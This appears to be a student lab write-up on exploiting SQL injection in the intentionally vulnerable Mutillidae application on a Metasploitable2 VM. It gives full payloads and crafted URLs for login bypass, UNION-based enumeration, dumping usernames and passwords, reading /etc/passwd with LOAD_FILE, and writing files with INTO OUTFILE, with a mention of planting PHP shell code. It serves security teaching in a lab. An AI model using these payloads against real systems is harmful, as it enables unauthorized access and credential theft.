# 8.sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/bf32df6b-c739-4162-9889-636cabd90295)


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/04b7235d-e89c-48f6-aeb9-bc1c518d64e0)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/fbd0faef-949c-4278-b8d9-515f532c1050)

Click on the menu Login/Register and register for an account


![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/a3029786-a350-40ab-b460-192b507d5cb8)


Click on the link “Please register here”
![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/d5f60160-e16b-498b-8315-ccd061578052)


Click on “Create Account” to display the following page:
![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/515c71a9-3abc-46b5-8e33-d4b7cbcffd66)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/57766976-cf46-440d-818c-fd586564073c)


Click “Login”. The logged in page will show as below:
![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/d51a5487-608a-4853-a19d-3be5b07678f1)




### Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/0365a421-a3c0-449a-b4b2-3539e1542e97)


Click the login button and you will see it enter into the administrator page.
![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/3d69bf8d-e572-4c07-94ce-b3567239b9de)



## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:
![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/3760ab51-8188-4b88-a470-764c2066a711)



![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/7d3dde1e-c643-4ef7-9e85-dbadd8560f70)


![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/b50fcd56-5f5d-4f1a-907a-ce0ec6b3cc47)

![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/4dcb9ee1-cee9-4772-aa76-2255ed147463)

![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/7fed2688-4aae-42c1-85b2-ae535c9d0fa3)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/1c2271ed-107f-4401-b2d0-974023a804c0)



Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/77be3f44-5866-43ad-a4e1-dd71a5db0145)


After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/50f05542-9512-4a22-84cb-435681100857)




When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/52fba2a5-d9a5-4903-9d82-acdfcd71887e)



 As it is having 5 columns the query worked fine and it provides the correct result


![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/e137698f-580b-479a-a219-5d8340f3ec7b)



Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/9cec213d-1094-4d1a-b9ff-7a13c8949e5b)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/bbabf206-9722-43ba-8e52-1f54356e3820)

 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details



![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/1036a2b9-0139-47b6-b75f-8bdcc8faf698)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/8fb2a9d0-5309-479d-a607-c0645a3e2709)


The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.



![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/fcff37b7-ce69-4e98-9146-20637c88f70c)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/c1cd7cc9-ed67-4e19-8184-1074cdc84107)






Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/605eaaf0-4538-481e-9d30-a10f2a1ab211)



### Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Saranyaaav/sqlinjection/assets/144870813/256ec804-9307-4591-8952-ab9650d5ac05)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).



## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
